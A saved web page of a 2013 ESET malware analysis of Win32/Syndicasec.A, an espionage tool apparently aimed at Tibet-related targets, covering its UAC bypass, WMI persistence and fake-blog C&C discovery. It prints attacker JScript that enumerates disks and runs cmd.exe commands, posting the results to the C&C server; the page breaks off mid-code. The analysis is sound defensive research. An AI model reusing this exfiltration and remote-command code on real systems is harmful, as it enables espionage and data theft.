<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/css/main.css?id=b3e7fe8a6c3736dca145" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Alexis Dorais-Joncas',
        'ArticleCategory': 'Uncategorized',
        'ArticleSection': '(not set)',
        'cookie-bar-hq': true
    });
</script>
<script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>

<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Syndicasec in the sin bin: targeted espionage malware in action | WeLiveSecurity</title>
<link rel="canonical" href="https://www.welivesecurity.com/2013/05/23/syndicasec-in-the-sin-bin/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Syndicasec in the sin bin: targeted espionage malware in action | WeLiveSecurity" />
<meta property="og:description" content="Technical analysis of Win32/Syndicasec.A, malware active in Nepal and China as far back as 2010, with a JavaScript payload registered in the Windows WMI subsystem and a system of fake blogs to discover its C&amp;C servers, hosted on Tibet-related domains." />
<meta property="og:url" content="https://www.welivesecurity.com/2013/05/23/syndicasec-in-the-sin-bin/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:tag" content="Malware" />
<meta property="article:section" content="Uncategorized" />
<meta property="article:published_time" content="2013-05-23T10:02:23+00:00" />
<meta property="article:modified_time" content="2014-03-21T20:08:30+00:00" />
<meta property="og:updated_time" content="2014-03-21T20:08:30+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2013/05/sino-lion.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2013/05/sino-lion.jpg" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="426" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Technical analysis of Win32/Syndicasec.A, malware active in Nepal and China as far back as 2010, with a JavaScript payload registered in the Windows WMI subsystem and a system of fake blogs to discover its C&amp;C servers, hosted on Tibet-related domains." />
<meta name="twitter:title" content="Syndicasec in the sin bin: targeted espionage malware in action | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2013/05/sino-lion.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single noimage">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>

<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="http://welivesecurity.com/category/ukraine-crisis-digital-security-resource-center/">
                                            Ukraine Crisis – Digital Security Resource Center                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/we-live-progress/">
                                            We Live Progress                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong>					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-noimage">
	<div class="container promo-text">
		<div class="inner clearfix">
			<div class="col-md-11 col-sm-11 col-xs-12 no-padding">
				<h1>Syndicasec in the sin bin: targeted espionage malware in action</h1>
<div class="excerpt">Technical analysis of Win32/Syndicasec.A, malware active in Nepal and China as far back as 2010, with a JavaScript payload registered in the Windows WMI subsystem and a system of fake blogs to discover its C&C servers, hosted on Tibet-related domains.</div>
<div class="post-meta">
    <div class="wls-authors">
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2013-05-23 10:02:23">23 May 2013 - 10:02AM</time>
		</span>
			</span>
</div>
			</div>
		</div>
	</div>
</div>	

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2013%2F05%2F23%2Fsyndicasec-in-the-sin-bin%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2013%2F05%2F23%2Fsyndicasec-in-the-sin-bin%2F&text=Syndicasec in the sin bin: targeted espionage malware in action%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2013%2F05%2F23%2Fsyndicasec-in-the-sin-bin%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt noimage">
                                <p>Technical analysis of Win32/Syndicasec.A, malware active in Nepal and China as far back as 2010, with a JavaScript payload registered in the Windows WMI subsystem and a system of fake blogs to discover its C&#038;C servers, hosted on Tibet-related domains.</p>
                            </div>

                            <p>Malware researchers receive so many malicious code samples every day that prioritization for deep examination becomes an important part of the analysis process. In some instances, it is easier to decide than others. Such is the case for a sample we recently came across here at ESET named <a href="http://www.virusradar.com/en/Win32_Syndicasec.A/description">Win32/Syndicasec.A</a>, for which the decision was pretty easy, for a variety of reasons:</p>
<ul>
<li>Our telemetry systems show that the infection scale is extremely small and strictly limited to Nepal and China. Previous versions of this threat were identified dating back to 2010.</li>
<li>The main payload is a piece of Javascript code registered in the Windows WMI subsystem, an unusual technique.</li>
<li>The threat uses fake blogs to discover its C&amp;C servers, which are hosted on Tibet-related domains.</li>
<li>The commands sent to our test machine infected for the purpose of this investigation were sent manually by the attacker and consisted in collecting information from the filesystem and the registry.</li>
<li>The characteristics of this operation are very similar to previous campaigns of espionage against Tibetan activists such as <a href="/search/?s=lamadai+payload&amp;x=0&amp;y=0" target="_blank">OS X Lamadai</a> and <a href="http://labs.alienvault.com/labs/index.php/2012/alienvault-research-used-as-lure-in-targeted-attacks/" target="_blank">others</a>. <strong><strong></strong></strong></li>
</ul>
<p>Read on to learn the details about the installation and persistence mechanisms used by this malware and its native capabilities and communication protocol. We will also present the bot behavior we observed during our analysis and conclude with some background research about the threat and the domains and IP addresses with which it is associated.</p>
<h2>Installation &amp; Persistence</h2>
<p>Win32/Syndicasec uses an exploit to get access to a target computer in the first instance. Our engine successfully stopped the exploitation attempt but was unable to capture the original exploit itself. Upon successful exploitation, a two-stage installation process begins.</p>
<p>The stage 1 dropper makes a few sanity checks on the system. It will look for the presence of <em>%SYSTEM32%\sysprep.exe</em>: if that is present, a cabinet archive (.cab) will be copied into the <em>%TEMP%</em> folder and its content (a single library) will be installed to <em>%SYSTEM32%\cryptbase.dll</em> using the standard Windows Update Standalone installer (<em>wusa.exe</em>):</p>
<p><a href="/wp-content/uploads/2013/05/syndicasec012-15.png"><img class="aligncenter size-full wp-image-21590" title="syndicasec012 (15)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-15.png" width="858" height="100" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-15.png 858w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-15-300x34.png 300w" sizes="(max-width: 858px) 100vw, 858px" /></a></p>
<p>The Cabinet file is stored unobfuscated inside the dropper. Only the Cabinet file header is missing: this is dynamically corrected in memory prior to writing the file on disk.</p>
<p>The dropper then attempts to exploit a vulnerability in Microsoft’s User Account Control (UAC) whitelisting process to run arbitrary commands with elevated privileges. This topic is well <a href="http://www.pretentiousname.com/misc/win7_uac_whitelist2.html" target="_blank">described by Leo Davidson</a>.</p>
<p>Inspecting the cryptbase.dll file reveals that it is a compiled version of <a href="http://www.pretentiousname.com/misc/W7E_Source/dllmain.cpp.html" target="_blank">Leo&#8217;s proof-of-concept code</a>, right down to the exact return value of <em>DllMain()</em>, which is -69.</p>
<p>This technique is one of the privilege escalation techniques used by <a href="/2013/05/01/mysterious-avatar-rootkit-with-api-sdk-and-yahoo-groups-for-cc-communication/">Win32/Rootkit.Avatar</a>, an advanced rootkit analyzed recently by our colleagues Anton Cherepanov and Aleksandr Matrosov.</p>
<p>Inside the library, we can see a path related to the compilation project. We were not able to find any meaning to the &#8220;<em>psm2</em>&#8221; project name.</p>
<p><a href="/wp-content/uploads/2013/05/syndicasec012-16.png"><img class="aligncenter size-full wp-image-21591" title="syndicasec012 (16)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-16.png" width="801" height="43" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-16.png 801w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-16-300x16.png 300w" sizes="(max-width: 801px) 100vw, 801px" /></a></p>
<p>Once this step has been performed, the second stage dropper is stored on disk as <em>%TEMP%\gupdate.exe</em>. If <em>sysprep.exe</em> is present on the system, the file is launched by a call to <em>sysprep.exe</em>, leveraging the UAC whitelist vulnerability previously explained. Otherwise, <em>gupdate.exe</em> is simply executed by a call to <em>cmd.exe</em>.</p>
<p><em>Gupdate.exe</em> is in charge of installing the real payload on the system. The technique used is one we rarely see in the wild and is based on the WMI subsystem that was well documented by Julius Dizon, <em>et al</em> of Trend Micro, in their excellent technical <a href="http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp__understanding-wmi-malware.pdf" target="_blank">whitepaper available here</a>. This same technique was also seen <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb" target="_blank">used by Stuxnet</a>.</p>
<p>This technique has the excellent property (from the attacker’s point of view) of not requiring any malicious code to be stored as a regular file on disk. This causes standard dynamic analysis tools such as Process Monitor to fail to clearly highlight the malicious activity.</p>
<p>Here is how the final payload is persistently installed on a victim&#8217;s system. First, a piece of JavaScript is decrypted by <em>gupdate.exe</em> using a simple XOR operation:</p>
<p><a href="/wp-content/uploads/2013/05/syndicasec012-18.png"><img class="aligncenter size-full wp-image-21593" title="syndicasec012 (18)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-18.png" width="620" height="298" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-18.png 620w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-18-300x144.png 300w" sizes="(max-width: 620px) 100vw, 620px" /></a></p>
<p dir="ltr" id="docs-internal-guid-721fe21e-b36b-da88-d094-6ea8c8eaab84">Then, the proper WMI classes are created.</p>
<p dir="ltr">1. __TimerInstruction</p>
<p>Win32/Syndicasec creates a <em>__TimerInstruction</em> to raise a custom event named &#8220;<em>ProbeScriptInit</em>&#8221; every 60,000 milliseconds.</p>
<p style="text-align: center;"><a href="/wp-content/uploads/2013/05/syndicasec012-19.png"><img class="aligncenter  wp-image-21594" title="syndicasec012 (19)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-19.png" width="668" height="305" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-19.png 1114w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-19-300x137.png 300w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-19-1024x467.png 1024w" sizes="(max-width: 668px) 100vw, 668px" /></a></p>
<p>2. __EventFilter</p>
<p>The <em>__EventFilter</em> class is responsible for linking the custom timer to the malicious code contained in the <em>__EventConsume</em>r element described below.</p>
<p style="text-align: center;"><a href="/wp-content/uploads/2013/05/syndicasec012-20.png"><img class="aligncenter  wp-image-21595" title="syndicasec012 (20)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-20.png" width="734" height="313" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-20.png 1224w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-20-300x127.png 300w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-20-1024x435.png 1024w" sizes="(max-width: 734px) 100vw, 734px" /></a></p>
<p>3. __EventConsumer</p>
<p>This class contains the malicious code to be executed every time the <em>__TimerInstruction</em> raises an event.</p>
<p style="text-align: center;"><a href="/wp-content/uploads/2013/05/syndicasec012-21.png"><img class="aligncenter  wp-image-21596" title="syndicasec012 (21)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-21.png" width="734" height="311" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-21.png 1223w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-21-300x127.png 300w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-21-1024x433.png 1024w" sizes="(max-width: 734px) 100vw, 734px" /></a></p>
<p>These objects are permanently registered in the <em>root\subscription</em> namespace, thus ensuring stealth and persistence.</p>
<h2>Malware capabilities &amp; network communication</h2>
<p>Let&#8217;s have a look now at the malicious script contained in the <em>__EventConsumer</em> object. The code is straightforward to analyze and almost self-documenting once properly formatted.</p>
<p>First, one of the hardcoded URLs is randomly chosen and contacted via a standard HTTP GET.  We&#8217;ll call these the Stage One URLs. All the hardcoded URLs lead to a RSS feed for a fake blog seen here:</p>
<p style="text-align: center;"><a href="/wp-content/uploads/2013/05/syndicasec012-2.png"><img class="aligncenter  wp-image-21598" title="syndicasec012 (2)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-2.png" width="632" height="293" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-2.png 1054w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-2-300x138.png 300w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-2-1024x474.png 1024w" sizes="(max-width: 632px) 100vw, 632px" /></a></p>
<p>The key element in this RSS feed is the <em>&lt;title&gt;</em> tag, which contains an encrypted string inside two &#8216;@&#8217; delimiters.</p>
<p>The script code shows which decoding routine is used to decrypt this string:</p>
<p><a href="/wp-content/uploads/2013/05/syndicasec012-4.png"><img class="aligncenter size-full wp-image-21600" title="syndicasec012 (4)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-4.png" width="423" height="222" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-4.png 423w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-4-300x157.png 300w" sizes="(max-width: 423px) 100vw, 423px" /></a></p>
<p>The decrypted string reveals another URL, which we will call a Stage Two URL. These URLs provide the address of the C&amp;C and are used to retrieve commands and post results.</p>
<p>The initial communication sent to a Stage Two URL is an HTTP POST request containing some basic information about the infected machine. The response to this request is an HTML <em>div</em> element that may contain one or more commands.</p>
<p style="text-align: center;"><a href="/wp-content/uploads/2013/05/syndicasec012-5.png"><img class="aligncenter  wp-image-21601" title="syndicasec012 (5)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-5.png" width="616" height="267" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-5.png 770w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-5-300x130.png 300w" sizes="(max-width: 616px) 100vw, 616px" /></a></p>
<p>Static analysis shows that a populated command array consists of obfuscated Javascript that gets directly eval()&#8217;ed by the master script. There are no built-in functions in the master script, so at this point we cannot tell what this malware is being used for.</p>
<h2>Observed activity</h2>
<p>In parallel with analysis of the code, we started to monitor the behavior of a test machine that we infected with Win32/Syndicasec. The first few days of monitoring showed no activity whatsoever. We then started receiving commands from the C&amp;C. The interaction between the C&amp;C and the bot did not look to be automated at all. Every day would bring different commands sent at non-regular time intervals, making it look just as if someone was sitting behind a console and manually controlling infected hosts.</p>
<p>Here is an excerpt from one of the first sessions with the C&amp;C we observed. If you pay attention to the timestamps, the entire list of commands was spread over more than 30 minutes. Note that each command includes all the Javascript needed to execute the entrypoint function. We have included the entire code for only a few interesting calls for the sake of brevity.</p>
<p>Commands that have the same timestamp were received in the same command array.</p>
<table width="741" border="1" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top" width="85">21:40:36</td>
<td valign="top" width="656"><strong>function</strong> getDataString<strong>(</strong>b<strong>)</strong> <strong>{</strong><strong>var</strong> a <strong>=</strong> <strong>[];</strong><strong>for</strong> <strong>(</strong><strong>var</strong> i <strong>=</strong> 0<strong>;</strong> i <strong>&lt;</strong> b<strong>.</strong>length<strong>;</strong> i<strong>++)</strong> <strong>{</strong>a<strong>.</strong>push<strong>(</strong>255 <strong>&#8211;</strong> b<strong>.</strong>charCodeAt<strong>(</strong>i<strong>))</strong><strong>}</strong><strong>var</strong> s <strong>=</strong> String<strong>.</strong>fromCharCode<strong>.</strong>apply<strong>(</strong>null<strong>,</strong> a<strong>);</strong><strong>var</strong> c <strong>=</strong> $<strong>.</strong>oShell<strong>.</strong>ExpandEnvironmentStrings<strong>(</strong>&#8220;%Temp%&#8221;<strong>)</strong> <strong>+</strong> &#8216;\\KB2761465-IE8.bin&#8217;<strong>;</strong>$<strong>.</strong>oStream<strong>.</strong>Mode <strong>=</strong> 3<strong>;</strong>$<strong>.</strong>oStream<strong>.</strong>Open<strong>();</strong>$<strong>.</strong>oStream<strong>.</strong>Type <strong>=</strong> 2<strong>;</strong>$<strong>.</strong>oStream<strong>.</strong>Charset <strong>=</strong> &#8216;iso8859-1&#8217;<strong>;</strong>$<strong>.</strong>oStream<strong>.</strong>WriteText<strong>(</strong>s<strong>);</strong>$<strong>.</strong>oStream<strong>.</strong>SaveToFile<strong>(</strong>c<strong>,</strong> 2<strong>);</strong>$<strong>.</strong>oStream<strong>.</strong>Close<strong>();</strong>$<strong>.</strong>oStream<strong>.</strong>Type <strong>=</strong> 1<strong>;</strong>$<strong>.</strong>oStream<strong>.</strong>Open<strong>();</strong>$<strong>.</strong>oStream<strong>.</strong>loadfromfile<strong>(</strong>c<strong>);</strong><strong>var</strong> d <strong>=</strong> $<strong>.</strong>oStream<strong>.</strong>Read<strong>();</strong>$<strong>.</strong>oStream<strong>.</strong>Close<strong>();</strong><strong>return</strong>d<strong>};</strong><strong>function</strong> EnumDisk<strong>()</strong> <strong>{</strong><strong>var</strong> e <strong>=</strong> GetObject<strong>(</strong>&#8220;winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2&#8221;<strong>);</strong>t <strong>=</strong> <strong>new</strong> Enumerator<strong>(</strong>e<strong>.</strong>ExecQuery<strong>(</strong>&#8220;select * from Win32_LogicalDisk&#8221;<strong>));</strong><strong>var</strong> s <strong>=</strong> &#8221;<strong>;</strong><strong>while</strong> <strong>(!</strong>t<strong>.</strong>atEnd<strong>())</strong> s <strong>+=</strong> &#8216;{&#8220;Name&#8221;:&#8221;&#8216; <strong>+</strong> t<strong>.</strong>item<strong>().</strong>Caption <strong>+</strong> &#8216;&#8221;,&#8221;DriveType&#8221;:&#8221;&#8216; <strong>+</strong> t<strong>.</strong>item<strong>().</strong>DriveType <strong>+</strong> &#8216;&#8221;},&#8217;<strong>,</strong> t<strong>.</strong>moveNext<strong>();</strong><strong>if</strong> <strong>(</strong>s<strong>.</strong>length <strong>&gt;</strong> 0<strong>)</strong> s <strong>=</strong> s<strong>.</strong>substr<strong>(</strong>0<strong>,</strong> s<strong>.</strong>length <strong>&#8211;</strong> 1<strong>);</strong>$<strong>.</strong>oHttp<strong>.</strong>Open<strong>(</strong>&#8220;POST&#8221;<strong>,</strong> $<strong>.</strong>sXmlUrl <strong>+</strong> &#8220;?&#8221; <strong>+</strong> $<strong>.</strong>sURLParam <strong>+</strong> &#8220;&amp;command=offlineresult&amp;commandid=&#8221; <strong>+</strong> commands<strong>[</strong>i<strong>].</strong>id<strong>,</strong> <strong>!</strong>1<strong>);</strong>$<strong>.</strong>oHttp<strong>.</strong>setRequestHeader<strong>(</strong>&#8220;CONTENT-TYPE&#8221;<strong>,</strong> &#8220;file&#8221;<strong>);</strong>$<strong>.</strong>oHttp<strong>.</strong>Send<strong>(</strong>getDataString<strong>(</strong>&#8216;[&#8216; <strong>+</strong> s <strong>+</strong> &#8216;]&#8217;<strong>));</strong><strong>return</strong> &#8220;&#8221;</p>
<p><strong>};</strong></p>
<p>EnumDisk<strong>();</strong></p>
<p>&nbsp;</td>
</tr>
<tr>
<td valign="top" width="85">21:41:37</td>
<td valign="top" width="656">ExpandDirectory<strong>(</strong>&#8216;C:\\&#8217;<strong>);</strong></td>
</tr>
<tr>
<td valign="top" width="85">21:41:37</td>
<td valign="top" width="656"><strong>function</strong> ExecuteCommand<strong>(</strong>a<strong>)</strong> <strong>{</strong><strong>var</strong> b <strong>=</strong> &#8216;asdfasfasfasdfsdfasdfsadf&#8217;<strong>;</strong><strong>var</strong> c <strong>=</strong> $<strong>.</strong>oShell<strong>.</strong>exec<strong>(</strong>&#8216;%ComSpec%&#8217;<strong>);</strong>c<strong>.</strong>StdIn<strong>.</strong>writeline<strong>(</strong>a<strong>);</strong>c<strong>.</strong>StdIn<strong>.</strong>writeline<strong>(</strong>b<strong>);</strong><strong>var</strong> d <strong>=</strong> &#8221;<strong>;</strong><strong>while</strong> <strong>(!</strong>c<strong>.</strong>StdOut<strong>.</strong>AtEndOfStream<strong>)</strong> <strong>{</strong><strong>var</strong> e <strong>=</strong> c<strong>.</strong>StdOut<strong>.</strong>ReadLine<strong>();</strong><strong>if</strong> <strong>(</strong>e<strong>.</strong>match<strong>(</strong>b<strong>))</strong> <strong>{</strong>d <strong>+=</strong> e<strong>.</strong>replace<strong>(</strong>b<strong>,</strong> &#8221;<strong>)</strong> <strong>+</strong> &#8216;\r\n&#8217;<strong>;</strong><strong>break</strong><strong>}</strong>d <strong>+=</strong> e <strong>+</strong>&#8216;\r\n&#8217;<strong>}</strong>$<strong>.</strong>oHttp<strong>.</strong>Open<strong>(</strong>&#8216;POST&#8217;<strong>,</strong> $<strong>.</strong>sXmlUrl <strong>+</strong> &#8216;?&#8217; <strong>+</strong> $<strong>.</strong>sURLParam <strong>+</strong> &#8216;&amp;command=offlineresult&amp;commandid=&#8217; <strong>+</strong> commands<strong>[</strong>i<strong>].</strong>id<strong>,</strong> <strong>false</strong><strong>);</strong>$<strong>.</strong>oHttp<strong>.</strong>setRequestHeader<strong>(</strong>&#8216;CONTENT-TYPE&#8217;<strong>,</strong> 